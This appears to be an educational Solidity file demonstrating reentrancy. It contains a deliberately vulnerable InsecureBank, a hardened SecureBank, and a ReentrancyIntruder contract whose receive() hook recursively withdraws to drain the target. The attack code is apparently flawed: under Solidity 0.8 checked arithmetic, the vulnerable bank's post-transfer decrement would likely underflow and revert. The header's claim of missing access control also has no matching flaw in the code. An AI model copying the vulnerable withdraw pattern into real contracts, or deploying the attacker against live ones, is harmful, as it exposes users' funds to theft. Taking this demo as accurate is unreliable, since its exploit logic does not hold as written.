// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title LimitedSecurityExpertiseAttackDefense - Attack and Defense Simulation for Limited Security Expertise in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Bank Contract (Missing Reentrancy Protection, Missing Access Control)
contract InsecureBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerable to reentrancy attack
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");

        balances[msg.sender] -= amount;

        emit Withdraw(msg.sender, amount);
    }

    receive() external payable {}
}

/// @notice Secure Bank Contract (Reentrancy Guard + Role-Based Access)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureBank is ReentrancyGuard, Ownable {
    mapping(address => uint256) private balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed owner, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Zero deposit");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");

        emit Withdraw(msg.sender, amount);
    }

    function emergencyWithdrawAll() external onlyOwner nonReentrant {
        uint256 balance = address(this).balance;
        (bool sent, ) = owner().call{value: balance}("");
        require(sent, "Emergency withdrawal failed");

        emit EmergencyWithdraw(owner(), balance);
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    receive() external payable {}
}

/// @notice Attack contract simulating reentrancy exploit
contract ReentrancyIntruder {
    address public targetInsecure;
    uint256 public attackAmount = 1 ether;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    // Attack starts here
    function attack() external payable {
        require(msg.value >= attackAmount, "Send enough ether");

        // Deposit
        (bool success1, ) = targetInsecure.call{value: attackAmount}(
            abi.encodeWithSignature("deposit()")
        );
        require(success1, "Initial deposit failed");

        // Withdraw to trigger reentrancy
        (bool success2, ) = targetInsecure.call(
            abi.encodeWithSignature("withdraw(uint256)", attackAmount)
        );
        require(success2, "Initial withdraw failed");
    }

    receive() external payable {
        if (address(targetInsecure).balance >= attackAmount) {
            targetInsecure.call(
                abi.encodeWithSignature("withdraw(uint256)", attackAmount)
            );
        }
    }
}
